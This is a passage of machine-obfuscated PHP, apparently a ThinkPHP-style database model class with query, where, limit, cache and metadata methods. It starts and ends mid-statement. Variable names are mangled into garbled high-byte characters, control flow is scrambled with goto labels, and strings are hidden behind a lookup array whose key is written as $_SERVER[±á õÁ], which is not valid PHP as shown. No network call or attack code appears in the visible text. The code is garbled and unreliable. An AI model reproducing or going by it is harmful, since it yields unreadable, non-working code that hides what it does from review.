µ±¦ŞÊœ[7] ? in_array($f”Ñ²Õ©°ç, $cÍÅ¿—õš”) : !in_array($f”Ñ²Õ©°ç, $cÍÅ¿—õš”); case $C µ±¦ŞÊœ[336]: case $C µ±¦ŞÊœ[337]: if (is_array($c®‰¨ƒ¦Â)) { $AĞŠÉÛ³ï = $c®‰¨ƒ¦Â[0]; $B³–Îéåí… = $c®‰¨ƒ¦Â[1]; } else { list($AĞŠÉÛ³ï, $B³–Îéåí…) = explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â); } return $AÎ¿¡‹ßºÌ == $C µ±¦ŞÊœ[336] ? $f”Ñ²Õ©°ç >= $AĞŠÉÛ³ï && $f”Ñ²Õ©°ç <= $B³–Îéåí… : $f”Ñ²Õ©°ç < $AĞŠÉÛ³ï || $f”Ñ²Õ©°ç > $B³–Îéåí…; case $C µ±¦ŞÊœ[338]: case $C µ±¦ŞÊœ[339]: return $AÎ¿¡‹ßºÌ == $C µ±¦ŞÊœ[338] ? $f”Ñ²Õ©°ç == $c®‰¨ƒ¦Â : $f”Ñ²Õ©°ç != $c®‰¨ƒ¦Â; case $C µ±¦ŞÊœ[340]: $D¯æº…ŒÏß = mb_strlen($f”Ñ²Õ©°ç, $C µ±¦ŞÊœ[341]); if (strpos($c®‰¨ƒ¦Â, $C µ±¦ŞÊœ[57])) { list($AĞŠÉÛ³ï, $B³–Îéåí…) = explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â); return $D¯æº…ŒÏß >= $AĞŠÉÛ³ï && $D¯æº…ŒÏß <= $B³–Îéåí…; } else { return $D¯æº…ŒÏß == $c®‰¨ƒ¦Â; } case $C µ±¦ŞÊœ[342]: list($e§µ´óíš·, $F©‚©®Š­…) = explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â); if (!is_numeric($e§µ´óíš·)) { $e§µ´óíš· = strtotime($e§µ´óíš·); } if (!is_numeric($F©‚©®Š­…)) { $F©‚©®Š­… = strtotime($F©‚©®Š­…); } return NOW_TIME >= $e§µ´óíš· && NOW_TIME <= $F©‚©®Š­…; case $C µ±¦ŞÊœ[343]: return in_array(get_client_ip(), explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â)); case $C µ±¦ŞÊœ[344]: return !in_array(get_client_ip(), explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â)); case $C µ±¦ŞÊœ[331]: default: return $this->regex($f”Ñ²Õ©°ç, $c®‰¨ƒ¦Â); } } public function query($BìİèñºÊÏ, $cì½Îïä = false) { $dÇíÆÚ•„¨ =& $_SERVER[±á õÁ]; if (!is_bool($cì½Îïä) && !is_array($cì½Îïä)) { $cì½Îïä = func_get_args(); array_shift($cì½Îïä); } $BìİèñºÊÏ = str_replace(array($dÇíÆÚ•„¨[14], $dÇíÆÚ•„¨[345]), $dÇíÆÚ•„¨[60], $BìİèñºÊÏ); $BìİèñºÊÏ = $this->parseSql($BìİèñºÊÏ, $cì½Îïä); return $this->db->query($BìİèñºÊÏ); } public function execute($Cœ‘´Ú…¦ğ, $D¯ó©©‚ïÌ = false) { if (!is_bool($D¯ó©©‚ïÌ) && !is_array($D¯ó©©‚ïÌ)) { $D¯ó©©‚ïÌ = func_get_args(); array_shift($D¯ó©©‚ïÌ); } $Cœ‘´Ú…¦ğ = $this->parseSql($Cœ‘´Ú…¦ğ, $D¯ó©©‚ïÌ); return $this->db->execute($Cœ‘´Ú…¦ğ); } protected function parseSql($FÂÓ‰ö¤¶, $B‹Ô‹Â®Ì) { $AŒ£ëâæò =& $_SERVER[±á õÁ]; if (!0 === $B‹Ô‹Â®Ì) { $AĞ¥‡Ê„„Û = $this->_parseOptions(); $FÂÓ‰ö¤¶ = $this->db->parseSql($FÂÓ‰ö¤¶, $AĞ¥‡Ê„„Û); } elseif (is_array($B‹Ô‹Â®Ì)) { $B‹Ô‹Â®Ì = array_map(array($this->db, $AŒ£ëâæò[346]), $B‹Ô‹Â®Ì); $FÂÓ‰ö¤¶ = vsprintf($FÂÓ‰ö¤¶, $B‹Ô‹Â®Ì); } else { $FÂÓ‰ö¤¶ = strtr($FÂÓ‰ö¤¶, array($AŒ£ëâæò[347] => $this->getTableName(), $AŒ£ëâæò[348] => think_config($AŒ£ëâæò[247]))); } $this->db->setModel($this->name); return $FÂÓ‰ö¤¶; } public function db($f³°à˜—–± = '', $e¤Ç›Üİ‹ô = '', $f’Éß¸Å½É = array()) { goto b”âÓÁ¦õ•; b”âÓÁ¦õ•: $D‰ÉíÓŠªğ =& $_SERVER[±á õÁ]; if ($D‰ÉíÓŠªğ[43] === $f³°à˜—–± && $this->db) { return $this->db; } static $B”‘´ÂàÆé = array(); goto Cã…®ß­š ; AèöÌÏô¿: $B”‘´ÂàÆé[$f³°à˜—–±] = $e¤Ç›Üİ‹ô; $this->db = $a¶ô¾†“‹[$f³°à˜—–±]; $this->_after_db(); goto dÈ‹™´; Cã…®ß­š : static $a¶ô¾†“‹ = array(); if (!isset($a¶ô¾†“‹[$f³°à˜—–±]) || isset($a¶ô¾†“‹[$f³°à˜—–±]) && $e¤Ç›Üİ‹ô && $B”‘´ÂàÆé[$f³°à˜—–±] != $e¤Ç›Üİ‹ô) { if (!empty($e¤Ç›Üİ‹ô) && is_string($e¤Ç›Üİ‹ô) && !1 === strpos($e¤Ç›Üİ‹ô, $D‰ÉíÓŠªğ[8])) { $e¤Ç›Üİ‹ô = think_config($e¤Ç›Üİ‹ô); } $a¶ô¾†“‹[$f³°à˜—–±] = Db::getInstance($e¤Ç›Üİ‹ô); } elseif (NULL === $e¤Ç›Üİ‹ô) { $a¶ô¾†“‹[$f³°à˜—–±]->close(); unset($a¶ô¾†“‹[$f³°à˜—–±]); return; } if (!empty($f’Éß¸Å½É)) { if (is_string($f’Éß¸Å½É)) { parse_str($f’Éß¸Å½É, $f’Éß¸Å½É); } foreach ($f’Éß¸Å½É as $dĞ…Ïéˆ·À => $bŒÓà™ßÎÇ) { $this->setProperty($dĞ…Ïéˆ·À, $bŒÓà™ßÎÇ); } } goto AèöÌÏô¿; dÈ‹™´: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DÅ•ˆŒŸáÜ; DÅ•ˆŒŸáÜ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eÅˆ®ğÎ = get_class($this); if ($eÅˆ®ğÎ == $_SERVER[±á õÁ][349]) { return $this->name; } $this->name = substr($eÅˆ®ğÎ, 0, -5); } return $this->name; } public function getTableName() { $F‚°õÇº =& $_SERVER[±á õÁ]; if (empty($this->trueTableName)) { $E²ÒæÎå†Á = !empty($this->tablePrefix) ? $this->tablePrefix : $F‚°õÇº[43]; if (!empty($this->tableName)) { $E²ÒæÎå†Á .= $this->tableName; } else { $E²ÒæÎå†Á .= think_parse_name($this->name); } $this->trueTableName = strtolower($E²ÒæÎå†Á); } return (!empty($this->dbName) ? $this->dbName . $F‚°õÇº[101] : $F‚°õÇº[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Eà³…¯ÏŒá =& $_SERVER[±á õÁ]; return isset($this->fields[$Eà³…¯ÏŒá[254]]) ? $this->fields[$Eà³…¯ÏŒá[254]] : $this->pk; } public function getDbFields() { $C§„Ì‰Ïã =& $_SERVER[±á õÁ]; if (isset($this->options[$C§„Ì‰Ïã[282]])) { $Fµ¢„¥ßáÂ = $this->db->getFields($this->options[$C§„Ì‰Ïã[282]]); return $Fµ¢„¥ßáÂ ? array_keys($Fµ¢„¥ßáÂ) : !1; } if ($this->fields) { $Fµ¢„¥ßáÂ = $this->fields; unset($Fµ¢„¥ßáÂ[$C§„Ì‰Ïã[253]], $Fµ¢„¥ßáÂ[$C§„Ì‰Ïã[254]], $Fµ¢„¥ßáÂ[$C§„Ì‰Ïã[255]], $Fµ¢„¥ßáÂ[$C§„Ì‰Ïã[252]]); return $Fµ¢„¥ßáÂ; } return !1; } public function data($e“ÕÁáïò = '') { $FÍ¸‹Ïšçï =& $_SERVER[±á õÁ]; if ($FÍ¸‹Ïšçï[43] === $e“ÕÁáïò && !empty($this->data)) { return $this->data; } if (is_object($e“ÕÁáïò)) { $e“ÕÁáïò = get_object_vars($e“ÕÁáïò); } elseif (is_string($e“ÕÁáïò)) { parse_str($e“ÕÁáïò, $e“ÕÁáïò); } elseif (!is_array($e“ÕÁáïò)) { think_exception(think_lang($FÍ¸‹Ïšçï[274])); } $this->data = $e“ÕÁáïò; return $this; } public function join($c¶·£ÕÓîí) { $a†‘Ş’ñù =& $_SERVER[±á õÁ]; if (is_array($c¶·£ÕÓîí)) { $this->options[$a†‘Ş’ñù[285]] = $c¶·£ÕÓîí; } elseif (!empty($c¶·£ÕÓîí)) { $this->options[$a†‘Ş’ñù[285]][] = $c¶·£ÕÓîí; } return $this; } public function union($dÏòÁĞù©, $fìŞÅÊ«¿© = false) { goto F¥¥Ì¦ÍÆó; bÁÃç†®Î: return $this; goto d‡¹Ïòø­á; F¥¥Ì¦ÍÆó: $eŠ°‰‡çØ³ =& $_SERVER[±á õÁ]; if (empty($dÏòÁĞù©)) { return $this; } if ($fìŞÅÊ«¿©) { $this->options[$eŠ°‰‡çØ³[350]][$eŠ°‰‡çØ³[351]] = !0; } goto cãÁö¸í£; cãÁö¸í£: if (is_object($dÏòÁĞù©)) { $dÏòÁĞù© = get_object_vars($dÏòÁĞù©); } if (is_string($dÏòÁĞù©)) { $Fî¦ƒ£­Œ = $dÏòÁĞù©; } elseif (is_array($dÏòÁĞù©)) { if (isset($dÏòÁĞù©[0])) { $this->options[$eŠ°‰‡çØ³[350]] = array_merge($this->options[$eŠ°‰‡çØ³[350]], $dÏòÁĞù©); return $this; } else { $Fî¦ƒ£­Œ = $dÏòÁĞù©; } } else { think_exception(think_lang($eŠ°‰‡çØ³[274])); } $this->options[$eŠ°‰‡çØ³[350]][] = $Fî¦ƒ£­Œ; goto bÁÃç†®Î; d‡¹Ïòø­á: } public function cache($fŠ×£‰Ü©¥ = true, $BÑ´…Ëç¡µ = null, $A¯ÏŒĞİ = '') { $e£Îˆ‰Œ–Î =& $_SERVER[±á õÁ]; if (!1 !== $fŠ×£‰Ü©¥) { $this->options[$e£Îˆ‰Œ–Î[352]] = array($e£Îˆ‰Œ–Î[99] => $fŠ×£‰Ü©¥, $e£Îˆ‰Œ–Î[342] => $BÑ´…Ëç¡µ, $e£Îˆ‰Œ–Î[39] => $A¯ÏŒĞİ); } return $this; } public function field($aİóâµ‘°, $AĞßŞ«´°± = false) { $BŠÊ“¦  =& $_SERVER[±á õÁ]; if (!0 === $aİóâµ‘°) { $aù°„îçâ© = $this->getDbFields(); $aİóâµ‘° = $aù°„îçâ© ? $aù°„îçâ© : $BŠÊ“¦ [190]; } elseif ($AĞßŞ«´°±) { if (is_string($aİóâµ‘°)) { $aİóâµ‘° = explode($BŠÊ“¦ [57], $aİóâµ‘°); } $aù°„îçâ© = $this->getDbFields(); $aİóâµ‘° = $aù°„îçâ© ? array_diff($aù°„îçâ©, $aİóâµ‘°) : $aİóâµ‘°; } $this->options[$BŠÊ“¦ [276]] = $aİóâµ‘°; return $this; } public function scope($bù»—““•¬ = '', $c£†¨æÓÄ = NULL) { $Eâ«Õ‰‰ç =& $_SERVER[±á õÁ]; if ($Eâ«Õ‰‰ç[43] === $bù»—““•¬) { if (isset($this->_scope[$Eâ«Õ‰‰ç[44]])) { $DÊä±İ®İ = $this->_scope[$Eâ«Õ‰‰ç[44]]; } else { return $this; } } elseif (is_string($bù»—““•¬)) { $aŸ¦ø¢İØ = explode($Eâ«Õ‰‰ç[57], $bù»—““•¬); $DÊä±İ®İ = array(); foreach ($aŸ¦ø¢İØ as $BÈ‹—¾©è¾) { if (!isset($this->_scope[$BÈ‹—¾©è¾])) { continue; } $DÊä±İ®İ = array_merge($DÊä±İ®İ, $this->_scope[$BÈ‹—¾©è¾]); } if (!empty($c£†¨æÓÄ) && is_array($c£†¨æÓÄ)) { $DÊä±İ®İ = array_merge($DÊä±İ®İ, $c£†¨æÓÄ); } } elseif (is_array($bù»—““•¬)) { $DÊä±İ®İ = $bù»—““•¬; } if (is_array($DÊä±İ®İ) && !empty($DÊä±İ®İ)) { $this->options = array_merge($this->options, array_change_key_case($DÊä±İ®İ)); } return $this; } public function where($FŠã¿Áì¡, $aí”¬Ëçì¯ = null) { $a¶Ò×îñ˜½ =& $_SERVER[±á õÁ]; if (!is_null($aí”¬Ëçì¯) && is_string($FŠã¿Áì¡)) { if (!is_array($aí”¬Ëçì¯)) { $aí”¬Ëçì¯ = func_get_args(); array_shift($aí”¬Ëçì¯); } $aí”¬Ëçì¯ = array_map(array($this->db, $a¶Ò×îñ˜½[346]), $aí”¬Ëçì¯); $FŠã¿Áì¡ = vsprintf($FŠã¿Áì¡, $aí”¬Ëçì¯); } elseif (is_object($FŠã¿Áì¡)) { $FŠã¿Áì¡ = get_object_vars($FŠã¿Áì¡); } elseif (is_array($FŠã¿Áì¡)) { foreach ($FŠã¿Áì¡ as $A¬ß­ò„ìá => $e¡ĞåÏ›Î¾) { if ((is_numeric($A¬ß­ò„ìá) || !$A¬ß­ò„ìá) && is_string($e¡ĞåÏ›Î¾)) { if (strpos($e¡ĞåÏ›Î¾, $a¶Ò×îñ˜½[353]) === 0) { continue; } think_trace($a¶Ò×îñ˜½[354], $a¶Ò×îñ˜½[43], $a¶Ò×îñ˜½[56]); die; } } } if (is_string($FŠã¿Áì¡) && $a¶Ò×îñ˜½[43] != $FŠã¿Áì¡) { $EÑÍôâ³øë = array(); $EÑÍôâ³øë[$a¶Ò×îñ˜½[355]] = $FŠã¿Áì¡; $FŠã¿Áì¡ = $EÑÍôâ³øë; } if (isset($this->options[$a¶Ò×îñ˜½[278]])) { $this->options[$a¶Ò×îñ˜½[278]] = array_merge($this->options[$a¶Ò×îñ˜½[278]], $FŠã¿Áì¡); } else { $this->options[$a¶Ò×îñ˜½[278]] = $FŠã¿Áì¡; } return $this; } public function limit($F¢¨Ò–Ÿ õ, $e™ËÎ¦‘îñ = null) { $fºÓÚØ‹â =& $_SERVER[±á õÁ]; $this->options[$fºÓÚØ‹â[295]] = is_null($e™ËÎ¦‘îñ) ? $F¢¨Ò–Ÿ õ : $F¢¨Ò–Ÿ õ . $fºÓÚØ‹â[57] . $e™ËÎ¦‘îñ; return $this; } public function page($bÒâˆò‹¤, $F´¶äß¶¾ = null) { $d¢‚÷ƒí«º =& $_SERVER[±á õÁ]; $this->options[$d¢‚÷ƒí«º[356]] = is_null($F´¶äß¶¾) ? $bÒâˆò‹¤ : $bÒâˆò‹¤ . $d¢‚÷ƒí«º[57] . $F´¶äß¶¾; return $this; } public function comment($f³Ê»÷ÇÚ…) { $this->options[$_SERVER[±á õÁ][357]] = $f³Ê»÷ÇÚ…; return $this; } public function setProperty($Fø„Â’ó´÷, $C¥‰°Éå) { if (property_exists($this, $Fø„Â’ó´÷)) { $this->{$Fø„Â’ó´÷} = $C¥‰°Éå; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\124\x69\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\x65\x72\x74\x2c\165\160\x64\x61\x74\x65", "\146\x75\156\143\x74\151\157\156"), array("\143\x72\x65\x61\x74\145\x54\x69\x6d\145", "\164\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\164\x69\x6f\x6e")); public function setDataAuto($f„®‘Â•“¦) { $this->dataAuto = $f„®‘Â•“¦; } public function __construct($F›ê”ê©ç = '', $D¨â±æâ•³ = '', $FÏàƒ¥ä‘İ = '') { parent::__construct($F›ê”ê©ç, $D¨â±æâ•³, $FÏàƒ¥ä‘İ); } public static function textEncode($B¯²º¥‚š) { if (!$B¯²º¥‚š) { return $B¯²º¥‚š; } $E—¦ïäÆ°Ò = json_encode($B¯²º¥‚š); $E—¦ïäÆ°Ò = preg_replace_callback($_SERVER[±á õÁ][358], function ($AÌùŸíÌº) { return addslashes($AÌùŸíÌº[0]); }, $E—¦ïäÆ°Ò); return json_decode($E—¦ïäÆ°Ò); } public static function textDecode($b¢™‰Æ­‡) { $Aš˜Çí²˜ =& $_SERVER[±á õÁ]; $a¤­Ä¼ÜÛ = json_encode($b¢™‰Æ­‡); $a¤­Ä¼ÜÛ = preg_replace_callback($Aš˜Çí²˜[359], function ($E¶ßÜ‰¾‰š) { return $_SERVER[±á õÁ][103]; }, $a¤­Ä¼ÜÛ); return json_decode($a¤­Ä¼ÜÛ); } protected $tableMeta = array(); protected function _beforeInsert(&$dã¿Ö»Û°, $DÍ´Ï†Š¼) { $DÏ³ó‰ÏÓù =& $_SERVER[±á õÁ]; if (!$this->checkDataAutoHas($DÏ³ó‰ÏÓù[360])) { return; } $this->dataBeforeFilter($dã¿Ö»Û°, $DÏ³ó‰ÏÓù[360]); } protected function _beforeUpdate(&$e³©°Š…¸°, $Eß´«ù“®) { $e…µ…î„ =& $_SERVER[±á õÁ]; if (!$this->checkDataAutoHas($e…µ…î„[361])) { return; } $this->dataBeforeFilter($e³©°Š…¸°, $e…µ…î„[361]); } protected function _afterSelect(&$CÙƒÕÄÓëø, $aöóñµ•Ï) { if (!is_array($CÙƒÕÄÓëø)) { return; } if (!$this->checkDataAutoHas($_SERVER[±á õÁ][362])) { return; } foreach ($CÙƒÕÄÓëø as &$Eš‡·Æ¶Ñœ) { $this->dataAfterFilter($Eš‡·Æ¶Ñœ); } unset($Eš‡·Æ¶Ñœ); } protected function _afterFind(&$f´Å„…Ú†É, $d¶ÄÈ·é) { if (!is_array($f´Å„…Ú†É)) { return; } if (!$this->checkDataAutoHas($_SERVER[±á õÁ][362])) { return; } $this->dataAfterFilter($f´Å„…Ú†É); } public function setAutoIncrement($bŒß¨†ØŠ) { $e¸è „ù”ë = array($this->getPk() => $bŒß¨†ØŠ); $F™ÊĞ ¢‡ = $this->data($e¸è „ù”ë)->add(); if ($F™ÊĞ ¢‡) { $this->delete($F™ÊĞ ¢‡); } } public function getAutoIncrement() { $Fö˜³©„Ä« = $this->getTableName(); $EÙŠåš¤âÄ = $this->max($this->getPk()); $fàä…ƒé¯› = $this->query("\x73\150\x6f\167\x20\x74\141\142\x6c\x65\x20\x73\164\141\164\x75\x73\40\167\150\145\x72\145\40\x4e\141\155\145\75\47{$Fö˜³©„Ä«}\x27"); $CÒÚêŸ®ì¤ = $fàä…ƒé¯›[0][$_SERVER[±á õÁ][363]]; $AÛÇ…×ªÄÛ = max($EÙŠåš¤âÄ, $CÒÚêŸ®ì¤); return $AÛÇ…×ªÄÛ; } protected function _callBefore($Eì¬óŞç®’, $B­ğÁèãÉ‚) { return $this->cacheCallCheck($Eì¬óŞç®’, $B­ğÁèãÉ‚, !1); } protected function _callAfter($b›×˜¨¢è¿, $aå–âÒº˜·) { return $this->cacheCallCheck($b›×˜¨¢è¿, $aå–âÒº˜·, !0); } protected function cacheFunctionAlias($F¤¬Ò„º°¦) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b„éßçÖ»Ÿ, $Cğ«“¸²Ö¦, $còŠÅ¶± = false) { $cãöê¦µñÂ = $this->cacheFunctionAlias($Cğ«“¸²Ö¦); if (!$cãöê¦µñÂ) { return; } foreach ($cãöê¦µñÂ as $CŞÂô¹¦„ñ => $A¦Ö§›¦ä©) { $bÙ—™†ù–Ö = $A¦Ö§›¦ä©[0]; $f§ÆßâÂ™ = explode($_SERVER[±á õÁ][57], $A¦Ö§›¦ä©[1]); if ($b„éßçÖ»Ÿ == $CŞÂô¹¦„ñ) { return $this->cacheFunctionGet($CŞÂô¹¦„ñ, $bÙ—™†ù–Ö); } if ($còŠÅ¶± && in_array($b„éßçÖ»Ÿ, $f§ÆßâÂ™)) { $this->cacheFunctionClear($CŞÂô¹¦„ñ, $bÙ—™†ù–Ö); } } } public function cacheFunctionGet($eî˜åîõ, $b½²„ñ†‰´) { $bˆóÖöåÈ‡ = $this->cacheKeyMake($eî˜åîõ, $b½²„ñ†‰´); $b ¸ˆø˜¥Î = Cache::get($bˆóÖöåÈ‡); if (!is_array($b ¸ˆø˜¥Î)) { $b ¸ˆø˜¥Î = call_user_func_array(array($this, $eî˜åîõ), array($b½²„ñ†‰´, !0)); Cache::set($bˆóÖöåÈ‡, $b ¸ˆø˜¥Î); } return $b ¸ˆø˜¥Î; } public function cacheFunctionClear($E­‚ì‡´, $E˜‡í…ñÙæ) { $cÇ¢šêò† = $E˜‡í…ñÙæ; if (!is_array($E˜‡í…ñÙæ)) { $cÇ¢šêò† = array($E˜‡í…ñÙæ); } foreach ($cÇ¢šêò† as $dŸ›ñÚÃÂ¶) { $Cƒ‡³ÁñÚ = $this->cacheKeyMake($E­‚ì‡´, $dŸ›ñÚÃÂ¶); Cache::remove($Cƒ‡³ÁñÚ); } } private function cacheKeyMake($døâàÎ¾®, $e•Ó‘ÄÅÃ¾) { $AÎ·’‹ŸĞ¡ =& $_SERVER[±á õÁ]; return get_class($this) . $AÎ·’‹ŸĞ¡[80] . $døâàÎ¾® . $AÎ·’‹ŸĞ¡[364] . $e•Ó‘ÄÅÃ¾; } protected function selectPage($aŒÆîéø½ = 200, $AñÉšŒ§‹á = 1) { goto eòÚ š…§‹; f‡ ºİšÂ: $Cé†©¡”… = ceil($e‰ÑŸÉÇÒá / $aŒÆîéø½); $AñÉšŒ§‹á = intval(isset($in[$f´›î—‡ê¡[356]]) ? $in[$f´›î—‡ê¡[356]] : $AñÉšŒ§‹á); $AñÉšŒ§‹á = $AñÉšŒ§‹á <= 1 ? 1 : ($AñÉšŒ§‹á >= $Cé†©¡”… ? $Cé†©¡”… : $AñÉšŒ§‹á); goto AÇ™é½†¡˜; c¼ˆ”¢…ì¿: if ($Cé†©¡”… == 1) { $e‰ÑŸÉÇÒá = count($d´Á“Ï×¤); } $aãÕ”ëğÒ• = array($f´›î—‡ê¡[367] => array($f´›î—‡ê¡[368] => $e‰ÑŸÉÇÒá, $f´›î—‡ê¡[365] => $aŒÆîéø½, $f´›î—‡ê¡[356] => $AñÉšŒ§‹á, $f´›î—‡ê¡[369] => $Cé†©¡”…), $f´›î—‡ê¡[370] => $d´Á“Ï×¤ ? $d´Á“Ï×¤ : array()); return $aãÕ”ëğÒ•; goto f¬ÌŸè§šÚ; AÚİÖ¶Şµ: $c¨•£Ø™’‚ = 4000; $aŒÆîéø½ = isset($in[$f´›î—‡ê¡[365]]) ? $in[$f´›î—‡ê¡[365]] : $aŒÆîéø½; if ($aŒÆîéø½ === -1) { unset($in[$f´›î—‡ê¡[365]]); $c¨•£Ø™’‚ = 100000000; $aŒÆîéø½ = $c¨•£Ø™’‚; } goto c‹Óï‹Ã‘²; c‹Óï‹Ã‘²: $eìÄ«—º»Ğ = $B½ßÅàÛ; $eìÄ«—º»Ğ[$f´›î—‡ê¡[366]] = array(); $this->optionsValue($eìÄ«—º»Ğ); goto FäéÂœäâ—; eòÚ š…§‹: $f´›î—‡ê¡ =& $_SERVER[±á õÁ]; global $in; $B½ßÅàÛ = $this->optionsValue(); goto AÚİÖ¶Şµ; FäéÂœäâ—: $e‰ÑŸÉÇÒá = intval($this->count()); $aŒÆîéø½ = intval($aŒÆîéø½); $aŒÆîéø½ = $aŒÆîéø½ <= 5 ? 5 : ($aŒÆîéø½ >= $c¨•£Ø™’‚ ? $c¨•£Ø™’‚ : $aŒÆîéø½); goto f‡ ºİšÂ; AÇ™é½†¡˜: $this->optionsValue($B½ßÅàÛ); $d´Á“Ï×¤ = $this->page($AñÉšŒ§‹á, $aŒÆîéø½)->select(); $d´Á“Ï×¤ = is_array($d´Á“Ï×¤) ? $d´Á“Ï×¤ : array(); goto c¼ˆ”¢…ì¿; f¬ÌŸè§šÚ: } protected function checkLength($e›«ã×Éçø, $fÍùÎÖôŠ = 0, $f¸ƒÔ©Â†Ÿ = '') { $FõİìàšÜÇ =& $_SERVER[±á õÁ]; $fÍùÎÖôŠ = $fÍùÎÖôŠ ? $fÍùÎÖôŠ : 65536; if (!$e›«ã×Éçø || strlen($e›«ã×Éçø) < $fÍùÎÖôŠ) { return; } $f¸ƒÔ©Â†Ÿ = $f¸ƒÔ©Â†Ÿ ? $f¸ƒÔ©Â†Ÿ . $FõİìàšÜÇ[77] : $FõİìàšÜÇ[43]; show_json($f¸ƒÔ©Â†Ÿ . LNG($FõİìàšÜÇ[371]) . "\50{$fÍùÎÖôŠ}\x29", !1); } protected function metaSet($D‡ĞŒ¥­õ, $DŒİ«Û’Œ = null, $bÍÊîŠĞ“ = null) { goto d…“Åñ×¥Ó; d…“Åñ×¥Ó: $b¶šÆÇàã¤ =& $_SERVER[±á õÁ]; if (!$this->tableMeta) { return !1; } $AÁæ ·Ğ‹ = $this->tableMeta[$b¶šÆÇàã¤[372]]; goto aŒ´‚âè÷„; F—½½“õˆ½: if (is_null($DŒİ«Û’Œ)) { return $C¡«åÆÇ¬·->where(array($AÁæ ·Ğ‹ => $D‡ĞŒ¥­õ))->delete(); } if (is_null($bÍÊîŠĞ“) && is_string($DŒİ«Û’Œ)) { return $C¡«åÆÇ¬·->where($e­ùÆó³‰ç)->delete(); } $bŸˆ©„öáŸ = is_array($DŒİ«Û’Œ) ? $DŒİ«Û’Œ : array(); goto b•øŸª Ó; aŒ´‚âè÷„: $F›ì™º™Š† = $this->tableMeta[$b¶šÆÇàã¤[373]]; $C¡«åÆÇ¬· = Model($F›ì™º™Š†); $e­ùÆó³‰ç = array($AÁæ ·Ğ‹ => $D‡ĞŒ¥­õ, $b¶šÆÇàã¤[374] => $DŒİ«Û’Œ); goto F—½½“õˆ½; f†äë†ƒËŠ: $C¡«åÆÇ¬·->where(array($AÁæ ·Ğ‹ => $D‡ĞŒ¥­õ))->addAll($DÚ¹–‹ñÏ„, array(), !0); return !0; goto E¦¬Íçç–; b•øŸª Ó: if (is_string($DŒİ«Û’Œ)) { $bŸˆ©„öáŸ[$DŒİ«Û’Œ] = $bÍÊîŠĞ“; } $DÚ¹–‹ñÏ„ = array(); foreach ($bŸˆ©„öáŸ as $a ´Óñï²– => $dŸ„®ïœ‘©) { $this->checkLength($dŸ„®ïœ‘©, !1, $F›ì™º™Š† . $b¶šÆÇàã¤[4] . $a ´Óñï²–); $DÚ¹–‹ñÏ„[] = array($AÁæ ·Ğ‹ => $D‡ĞŒ¥­õ, $b¶šÆÇàã¤[99] => $a ´Óñï²–, $b¶šÆÇàã¤[375] => $dŸ„®ïœ‘©); } goto f†äë†ƒËŠ; E¦¬Íçç–: } public function metaGet($A¾Ò•Æ”¸‹, $bóÅöÃÍÒÆ = false) { goto D¡Îíğ; D¡Îíğ: $eñÏ²ö­ç =& $_SERVER[±á õÁ]; if (!$this->tableMeta) { return array(); } $DÖŠîÛœ÷„ = $this->tableMeta[$eñÏ²ö­ç[372]]; goto bØ¾Ëàáß; bØ¾Ëàáß: $C³İ³Ú‹òö = Model($this->tableMeta[$eñÏ²ö­ç[373]]); if ($bóÅöÃÍÒÆ) { $aŞİ†åï¼› = array($DÖŠîÛœ÷„ => $A¾Ò•Æ”¸‹, $eñÏ²ö­ç[99] => $bóÅöÃÍÒÆ); return $C³İ³Ú‹òö->where($aŞİ†åï¼›)->getField($eñÏ²ö­ç[375]); } $aŞİ†åï¼› = array($DÖŠîÛœ÷„ => $A¾Ò•Æ”¸‹); goto b”„æ‡øá; b”„æ‡øá: $aÔ‘ŸßØ»¶ = $C³İ³Ú‹òö->field($eñÏ²ö­ç[376])->where($aŞİ†åï¼›)->select(); $aÔ‘ŸßØ»¶ = array_to_keyvalue($aÔ‘ŸßØ»¶, $eñÏ²ö­ç[99], $eñÏ²ö­ç[375]); return $aÔ‘ŸßØ»¶; goto C¢ñ¢‡©©­; C¢ñ¢‡©©­: } private function checkDataAutoHas($Eˆœµš·©§) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cğÏ°¬¥”) { if (in_array($Eˆœµš·©§, explode($_SERVER[±á õÁ][57], $cğÏ°¬¥”[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$FÈ£Ú«é§Ñ, $cÆù™„Ğ¬Š) { $A¼íÊæ½ó• =& $_SERVER[±á õÁ]; foreach ($this->dataAuto as $eÓ“óĞ×™—) { $Fø”ÜĞÄˆ’ = $eÓ“óĞ×™—[0]; if (!in_array($cÆù™„Ğ¬Š, explode($A¼íÊæ½ó•[57], $eÓ“óĞ×™—[2]))) { continue; } switch (trim($eÓ“óĞ×™—[3])) { case $A¼íÊæ½ó•[324]: case $A¼íÊæ½ó•[325]: $aÕØº°Œ¸‹ = $eÓ“óĞ×™—[1]; $B£òŞ“œŒ× = isset($eÓ“óĞ×™—[4]) ? (array) $eÓ“óĞ×™—[4] : array(); if ($aÕØº°Œ¸‹ == $A¼íÊæ½ó•[203] && array_key_exists($Fø”ÜĞÄˆ’, $FÈ£Ú«é§Ñ)) { if (!$FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]) { unset($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]); } break; } if (isset($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’])) { array_unshift($B£òŞ“œŒ×, $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]); } if ($A¼íÊæ½ó•[324] == $eÓ“óĞ×™—[3]) { $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] = 